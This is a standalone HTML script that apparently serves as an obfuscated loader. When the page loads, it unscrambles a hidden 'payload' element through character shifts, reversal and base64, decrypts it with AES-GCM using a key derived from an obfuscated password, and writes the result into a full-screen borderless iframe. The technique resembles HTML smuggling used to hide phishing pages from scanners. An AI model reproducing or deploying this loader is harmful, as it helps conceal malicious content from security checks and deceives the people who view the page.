<script>
function getKey(obf){
  let a=[...obf].map(c=>String.fromCharCode(c.charCodeAt(0)-3)).join('');
  return atob(a.split('').reverse().join(''));
}
(async () => {
  let enc = document.getElementById('payload').textContent.trim();

  enc = enc.split('').map(c => String.fromCharCode((c.charCodeAt(0) - 1 + 256) % 256)).join('');
  enc = enc.replace(/XYZ/g, '');
  enc = enc.split('').reverse().join('');
  enc = atob(enc);

  const buf = Uint8Array.from(enc, c => c.charCodeAt(0));
  const salt = buf.slice(0, 16);
  const iv = buf.slice(16, 28);
  const tag = buf.slice(28, 44);
  const ct = buf.slice(44);

  const full = new Uint8Array(ct.length + tag.length);
  full.set(ct);
  full.set(tag, ct.length);

  const keyStr = getKey("yophxo6f");
  const keyMat = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(keyStr),
    'PBKDF2',
    false,
    ['deriveKey']
  );

  const key = await crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: salt,
      iterations: 200000,
      hash: 'SHA-256'
    },
    keyMat,
    { name: 'AES-GCM', length: 256 },
    false,
    ['decrypt']
  );

  const plain = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv: iv, tagLength: 128 },
    key,
    full
  );

  const html = new TextDecoder().decode(plain);

  const iframe = document.createElement('iframe');
  iframe.style = 'border:0;width:100vw;height:100vh;position:fixed;top:0;left:0;';
  document.body.appendChild(iframe);
  iframe.contentDocument.open();
  iframe.contentDocument.write(html);
  iframe.contentDocument.close();
})();
</script>
